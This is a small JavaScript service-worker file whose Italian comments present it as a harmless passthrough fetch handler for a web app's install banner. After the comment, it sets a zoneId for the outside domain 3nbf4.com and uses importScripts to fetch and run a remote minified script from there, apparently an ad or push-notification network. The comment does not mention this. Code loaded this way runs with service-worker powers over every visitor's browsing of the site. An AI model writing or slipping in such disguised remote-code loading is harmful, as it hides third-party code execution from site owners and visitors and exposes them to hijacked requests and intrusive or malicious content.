// Fetch handler richiesto da Chrome per il banner "Installa app" (PWA).
// Passthrough: non intercetta nulla, lascia passare tutte le richieste normalmente.
self.addEventListener('fetch', function () {});

self.options = {
    "domain": "3nbf4.com",
    "zoneId": 11096095
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
